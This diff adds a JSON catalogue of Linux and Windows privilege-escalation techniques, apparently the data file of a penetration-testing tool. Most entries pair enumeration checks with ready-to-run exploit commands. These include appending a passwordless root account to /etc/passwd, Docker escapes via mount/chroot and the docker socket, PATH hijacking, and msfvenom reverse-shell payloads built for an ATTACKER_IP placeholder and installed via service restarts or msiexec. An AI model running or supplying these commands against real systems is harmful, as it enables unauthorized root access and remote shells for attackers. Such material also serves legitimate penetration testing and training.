@@ -1,0 +1,188 @@
+{
+  "linux_suid": {
+    "name": "Find SUID Binaries",
+    "description": "Locate SUID binaries for privilege escalation",
+    "commands": [
+      "find / -perm -u=s -type f 2>/dev/null",
+      "find / -perm -4000 -type f 2>/dev/null",
+      "find / -perm -4000 -ls 2>/dev/null"
+    ],
+    "os": "linux"
+  },
+  
+  "linux_capabilities": {
+    "name": "Find Capabilities",
+    "description": "Find binaries with capabilities set",
+    "commands": [
+      "getcap -r / 2>/dev/null",
+      "/sbin/getcap -r / 2>/dev/null"
+    ],
+    "os": "linux"
+  },
+  
+  "linux_sudo": {
+    "name": "Sudo Privilege Check",
+    "description": "Check sudo permissions",
+    "commands": [
+      "sudo -l",
+      "sudo -ll"
+    ],
+    "exploits": {
+      "sudo_all": "If (ALL:ALL) ALL, run: sudo su",
+      "sudo_nopasswd": "If NOPASSWD, directly run the allowed command",
+      "sudo_env_keep": "Check for LD_PRELOAD or LD_LIBRARY_PATH"
+    },
+    "os": "linux"
+  },
+  
+  "linux_writable_passwd": {
+    "name": "Writable /etc/passwd",
+    "description": "Exploit writable passwd file",
+    "check": "ls -la /etc/passwd",
+    "exploit": "echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd",
+    "usage": "Then run: su hacker",
+    "os": "linux"
+  },
+  
+  "linux_cron": {
+    "name": "Cron Jobs Enumeration",
+    "description": "Find and exploit cron jobs",
+    "commands": [
+      "cat /etc/crontab",
+      "crontab -l",
+      "ls -la /etc/cron.*",
+      "cat /var/spool/cron/crontabs/*"
+    ],
+    "exploit": "Replace cron script with reverse shell",
+    "os": "linux"
+  },
+  
+  "linux_path_hijack": {
+    "name": "PATH Hijacking",
+    "description": "Exploit unsafe PATH in sudo commands",
+    "check": "sudo -l | grep '(root) NOPASSWD'",
+    "exploit_steps": [
+      "echo '/bin/bash' > /tmp/exploitable_binary",
+      "chmod +x /tmp/exploitable_binary",
+      "export PATH=/tmp:$PATH",
+      "sudo /path/to/vulnerable/script"
+    ],
+    "os": "linux"
+  },
+  
+  "linux_nfs_root_squash": {
+    "name": "NFS Root Squashing",
+    "description": "Exploit NFS shares with no_root_squash",
+    "check": "cat /etc/exports | grep no_root_squash",
+    "exploit_steps": [
+      "# On attacker machine",
+      "mkdir /tmp/nfs",
+      "mount -t nfs {{TARGET_IP}}:/share /tmp/nfs",
+      "cp /bin/bash /tmp/nfs/bash",
+      "chmod +s /tmp/nfs/bash",
+      "# On target",
+      "/share/bash -p"
+    ],
+    "variables": ["TARGET_IP"],
+    "os": "linux"
+  },
+  
+  "linux_docker_escape": {
+    "name": "Docker Escape",
+    "description": "Escape from Docker container",
+    "check": "ls -la /.dockerenv",
+    "exploits": [
+      {
+        "name": "Privileged Container",
+        "check": "cat /proc/self/status | grep CapEff",
+        "exploit": "fdisk -l | grep /dev/sd && mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host bash"
+      },
+      {
+        "name": "Docker Socket",
+        "check": "ls -la /var/run/docker.sock",
+        "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+      }
+    ],
+    "os": "linux"
+  },
+  
+  "windows_unquoted_service_path": {
+    "name": "Unquoted Service Path",
+    "description": "Exploit unquoted service paths",
+    "check": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\"",
+    "exploit_steps": [
+      "# If path is C:\\Program Files\\Some Service\\service.exe",
+      "# Create C:\\Program.exe or C:\\Program Files\\Some.exe",
+      "msfvenom -p windows/shell_reverse_tcp LHOST={{ATTACKER_IP}} LPORT={{PORT}} -f exe > Program.exe",
+      "# Upload and restart service",
+      "sc stop \"ServiceName\"",
+      "sc start \"ServiceName\""
+    ],
+    "variables": ["ATTACKER_IP", "PORT"],
+    "os": "windows"
+  },
+  
+  "windows_alwaysinstallelevated": {
+    "name": "AlwaysInstallElevated",
+    "description": "Exploit Windows Installer privilege escalation",
+    "check": [
+      "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+    ],
+    "exploit": [
+      "msfvenom -p windows/shell_reverse_tcp LHOST={{ATTACKER_IP}} LPORT={{PORT}} -f msi > shell.msi",
+      "msiexec /quiet /qn /i shell.msi"
+    ],
+    "variables": ["ATTACKER_IP", "PORT"],
+    "os": "windows"
+  },
+  
+  "windows_token_impersonation": {
+    "name": "Token Impersonation",
+    "description": "Exploit SeImpersonatePrivilege",
+    "check": "whoami /priv | findstr SeImpersonatePrivilege",
+    "exploits": [
+      {
+        "name": "PrintSpoofer",
+        "usage": "PrintSpoofer.exe -i -c cmd"
+      },
+      {
+        "name": "JuicyPotato",
+        "usage": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}"
+      },
+      {
+        "name": "RoguePotato",
+        "usage": "RoguePotato.exe -r {{ATTACKER_IP}} -e \"cmd.exe\" -l 9999"
+      }
+    ],
+    "os": "windows"
+  },
+  
+  "kernel_exploits": {
+    "linux": {
+      "dirty_cow": {
+        "name": "Dirty COW (CVE-2016-5195)",
+        "affected": "Linux Kernel 2.6.22 - 4.8.3",
+        "check": "uname -r",
+        "exploit_url": "https://github.com/dirtycow/dirtycow.github.io"
+      },
+      "overlayfs": {
+        "name": "OverlayFS (CVE-2015-1328)",
+        "affected": "Ubuntu 12.04, 14.04, 14.10, 15.04",
+        "check": "uname -a | grep Ubuntu"
+      }
+    },
+    "windows": {
+      "ms16_032": {
+        "name": "MS16-032",
+        "affected": "Windows 7, 8, 10, Server 2008-2016",
+        "check": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""
+      },
+      "printspoofer": {
+        "name": "PrintSpoofer",
+        "affected": "Windows 10, Server 2016/2019",
+        "check": "whoami /priv | findstr SeImpersonatePrivilege"
+      }
+    }
+  }
+}
